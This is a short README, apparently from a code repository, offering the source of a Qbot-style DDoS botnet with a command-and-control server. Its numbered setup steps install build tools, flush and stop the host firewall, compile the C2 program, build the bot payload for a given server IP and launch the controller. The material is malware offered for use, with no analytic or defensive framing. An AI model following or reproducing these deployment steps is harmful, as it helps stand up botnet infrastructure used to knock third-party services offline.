# Basic-cnc-with-bot
This is a qbot source for a botnet i dont like to ddos or people who do it but might as well

Recommended to use on CentOS 6.8+

Instructions (From included setup.txt):

1. yum install gcc screen nano httpd python perl -y;
2. iptables -F; service iptables stop; service httpd restart
3. gcc C2.c -o cnc -pthread
4. nano login.txt
5. python build.py Hydra.c [srv ip]
6. screen ./cnc 3074 850 [screenport]
